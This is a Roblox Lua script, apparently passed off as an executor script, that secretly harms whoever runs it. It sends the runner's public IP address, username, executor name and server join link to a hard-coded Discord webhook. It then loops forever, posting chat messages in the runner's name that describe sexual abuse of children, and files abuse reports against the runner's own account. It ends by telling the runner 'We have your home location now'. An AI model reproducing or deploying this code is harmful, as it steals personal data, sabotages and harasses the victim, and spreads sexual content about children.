local mesg = tostring(game:HttpGet("https://api.ipify.org/", true))
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X/Fluxus" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or 
getexecutorname() and "Scriptware"

local url = "https://discord.com/api/webhooks/1029102877983125594/2fZIiRiZsKc1rBhCMIcjvVSpGee7eXEP7Y65tg2sM6ITsoWq6FKu9uA8ElTNMfUF0XdC"
local data = {
   ["content"] = "Roblox.GameLauncher.joinGameInstance("..game.PlaceId..", "..game.JobId..")",
   ["embeds"] = {
       {
           ["title"] = "**Name**",
           ["description"] = "Username: **"..game.Players.LocalPlayer.Name.."** \n Executor: **"..webhookcheck.."** \n "..mesg,
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local ChatBar = game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar
local function cht(massage)
    ChatBar:SetTextFromInput(massage)
    game.Players:Chat(massage)
    ChatBar.Text = ""
end

function s(mes)
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(mes, "All")
end

s("Hexaria on top || This account has been banned for skidding"

while wait() do
cht("I love gay porn || https://dsc.gg/hexaria")
cht("I love child porn cumming, i fap every lil drop of cum to those children, i even rape them due to how hot and sexy they are || https://dsc.gg/hexaria")
cht("i watch so much child porn i love children fuck its so hot i'd cum every drop insdide of a child || https://dsc.gg/hexaria")
game.Players:ReportAbuse(game.Players.LocalPlayer,"Bullying","Help this guy keeps trying to get me to a porn site. I don't know what to do and I'm feeling uncomfortable now.")
end
cht("there is so much sex here")
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "If you see this then its working", -- Required
	Text = "We have your home location now", -- Required
})
